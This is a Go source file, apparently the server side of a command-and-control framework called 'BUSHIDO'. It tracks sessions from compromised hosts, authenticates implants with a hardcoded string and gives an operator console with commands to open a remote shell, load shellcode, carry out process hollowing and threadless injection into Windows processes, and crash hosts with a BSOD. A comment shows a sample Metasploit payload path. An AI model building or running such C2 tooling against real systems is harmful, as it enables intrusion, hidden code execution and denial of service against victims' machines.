package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func NewSessionList() *SessionList {
	return &SessionList{
		Stop: make(chan struct{}),
	}
}

func (ll *SessionList) registerSession(port string, hostname string, user string, conn net.Conn) int {
	check := true
	id := -1
	for check {
		id = rand.Intn(9000)
		check = ll.checkIfSessionIDExist(id)
	}
	// Create a new Session struct
	newSession := &Session{
		id:       id,
		Port:     port,
		Status:   "Active",
		Hostname: hostname,
		User:     user,
		Conn:     conn,
	}
	// Add to the head of the linked list
	newSession.Next = ll.Head
	ll.Head = newSession
	return id
}

func authSession(conn *net.Conn) bool {
	auth := make([]byte, 32)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))
	(*conn).Write([]byte("AreYouAlive\n"))
	n, err := (*conn).Read(auth)
	if err != nil {
		fmt.Println() //Put this here for aesthetic reasons. Will use a go routine kill signal later to exit from handleclient proper
		fmt.Println()
		fmt.Println("[-]Error reading from connection:", err)
		return false
	}
	if n <= 1 {
		fmt.Println("[-]Error amount of data returned is less than 1")
		fmt.Println()
		return false
	}
	authString := string(auth[:n])

	// Perform authentication
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("[-]Authentication failed")
		fmt.Println()
		(*conn).Close()
		return false
	}
	(*conn).SetReadDeadline(time.Time{})
	return true
}

// Displays the active sessions
func (ll *SessionList) displaySessions() {
	fmt.Println("\n[!]Active Sessions:")
	current := ll.Head
	for current != nil {
		fmt.Println("[+]SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
	fmt.Println()
}

// func (ll *SessionList) updateSessionStatus(targetPort string, status string, conn net.Conn) {
// 	current := ll.Head
// 	for current.Port != targetPort {
// 		current = current.Next
// 	}
// 	current.Status = status
// 	current.Conn = conn
// }

func (ll *SessionList) checkIfSessionIDExist(id int) bool {
	//Case Empty List
	if ll.Head == nil {
		return false
	}
	current := ll.Head
	for current != nil {
		if current.id == id {
			return true //Return that it exists
		}
		current = current.Next
	}
	return false //After itterating through all of the list return that it dont exist
}

func (ll *SessionList) displaySessionInfo(id int) {
	if ll.Head == nil {
		return
	}
	current := ll.Head
	for current != nil {
		if current.id == id {
			idStr := strconv.Itoa(current.id)
			fmt.Println()
			fmt.Println("[!]Session Info Found !")
			fmt.Println("[+]ID: " + idStr)
			fmt.Print("[+]Hostname: " + current.Hostname) //New line is present within the hostname. Will remove it later
			fmt.Println("[+]User: " + current.User)       //New line also is present here wtf windows ?!
			return
		}
		current = current.Next
	}
	fmt.Println()
	fmt.Println("[-]Couldn't get session info ")
	fmt.Println()
	//After itterating through all of the list return that it dont exist
}

func (ll *SessionList) closeAllSessions() {
	fmt.Println()
	current := ll.Head
	for current != nil {
		fmt.Println("[-]Unit on", current.id, "lost")
		current.Conn.Close()
		current.Conn = nil // Clear the connections list

		current = current.Next
	}
	fmt.Println()
	ll.Head = nil // Reset the listener list
}

func (ll *SessionList) closeSession(id int) { //Will delete as well
	current := ll.Head
	if current == nil {
		return
	}
	if current.id == id {
		fmt.Println()
		fmt.Println("[!]Session Found !")
		fmt.Println("[+]Closing Session " + strconv.Itoa(current.id))
		current.Conn.Close()
		ll.Head = current.Next
		fmt.Println("[+]Succesfully Ended the Session")
		fmt.Println()
		return
	}
	prev := current
	current = current.Next
	for current != nil {
		if current.id == id {
			fmt.Println()
			fmt.Println("[!]Session Found !")
			fmt.Println("[+]Closing Session " + strconv.Itoa(current.id))
			current.Conn.Close()
			prev.Next = current.Next
			//current = nil
			fmt.Println("[+]Succesfully Ended the Session")
			fmt.Println()
			return
		}
		prev = current
		current = current.Next
	}
	fmt.Println()
	fmt.Println("[-]Session not found")
	fmt.Println()
}

func openSession(id int, ll *SessionList) {
	current := ll.Head
	if current == nil {
		fmt.Println()
		fmt.Println("\n[-]Session not found")
		fmt.Println()
		return
	}
	for current != nil {
		if current.id == id {
			fmt.Println("\n[!]Session Found !")
			fmt.Println("[!]Connecting ...")
			if !authSession(&current.Conn) {
				return
			}
			fmt.Println("[+]BUSHIDO Shell Open ...\n")
			reader := bufio.NewReader(os.Stdin)

			for {
				fmt.Print("BU$H1D0-1 >> ")
				command, err := reader.ReadString('\n')
				if err != nil {
					fmt.Println("[-]Error reading input:", err)
					continue
				} //Check how to make this prettier
				command = strings.TrimSpace(command)
				//playRegex := regexp.MustCompile(`play .+`)
				//playMatch := playRegex.FindString(command)
				loadRegex := regexp.MustCompile(`load .+`)
				loadMatch := loadRegex.FindString(command)
				cdRegex := regexp.MustCompile(`cd .+`)
				cdMatch := cdRegex.FindString(command)
				hollowRegex := regexp.MustCompile(`hollow .+ .+`)
				hollowMatch := hollowRegex.FindString(command)
				threadlessRegex := regexp.MustCompile(`threadless .+ .+`)
				threadlessMatch := threadlessRegex.FindString(command)
				if cdMatch != "" {
					dir2go := strings.Split(command, " ")[1]
					cd(&current.Conn, dir2go)
				}
				// if playMatch != "" {//Not happy with this one
				// 	audioFile := strings.Split(command, " ")[1]
				// 	playAudio(&current.Conn, audioFile)
				// }
				if loadMatch != "" {
					binFilePathLocal := strings.Split(command, " ")[1]
					load(&current.Conn, binFilePathLocal)
					fmt.Println()
				}
				if hollowMatch != "" {
					filePathLocal := strings.Split(command, " ")[1]
					//filePathTarget := strings.Split(command, " ")[2]
					filePathTarget := strings.Split(command, "\"")[1]
					//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
					fmt.Println()
					fmt.Println("[!]Local File Path: " + filePathLocal)
					fmt.Println("[!]Remote File Path: " + filePathTarget)
					hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
					fmt.Println()
				}
				if threadlessMatch != "" {
					//Try it with //threadless Bushido/msf.bin notepad.exe
					filePathLocal := strings.Split(command, " ")[1]
					remoteProcess := strings.Split(command, " ")[2]
					fmt.Println()
					fmt.Println("[!]Local File Path: " + filePathLocal)
					fmt.Println("[!]Remote File Path: " + remoteProcess)
					threadless(&current.Conn, filePathLocal, remoteProcess)
					fmt.Println()
				}
				switch command { //All of the functions called below will be found under bushido.go
				case "shell":
					shell(&current.Conn)
				case "hostinfo":
					ll.displaySessionInfo(current.id)
				case "bsod": //Refine it a bit more
					if bsod(&current.Conn) {
						fmt.Println()
						fmt.Println("[!]HOST BSOD !")
						fmt.Println("[?]Impliment Feature where the session is removed from the list when this happens")
						fmt.Println()
						return
					} else {
						fmt.Println()
						fmt.Println("[-]Couldn't BSOD the Host ...")
						fmt.Println()
					}
				case "bg":
					return
				case "exit":
					return
				// case "play": //The audio thing only works if the device is not a VM
				// 	fmt.Println()
				// 	fmt.Println("[?]Usage: play <fileNameInAudio>")
				// 	fmt.Println()
				//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
				case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
					fmt.Println("\n[?]Usage: load <pathTox64Shellcode>\n")
				case "cd":
					fmt.Println("\n[?]Usage: cd <dir>\n") //Works with relative and absolute paths
				case "ls":
					ls(&current.Conn)
				case "pwd":
					pwd(&current.Conn)
				case "threadless":
					fmt.Println("\n[?]Usage: threadless <pathToShellcodeLocal> <RemoteProcessName>\n")
				case "hollow":
					fmt.Println("\n[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
					fmt.Println("[?]Windows paths must have double backslashes as such: \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n")
				default:
				}
			}
		}
		current = current.Next
	}
	fmt.Println()
	fmt.Println("[-]Session not found")
	fmt.Println()
}
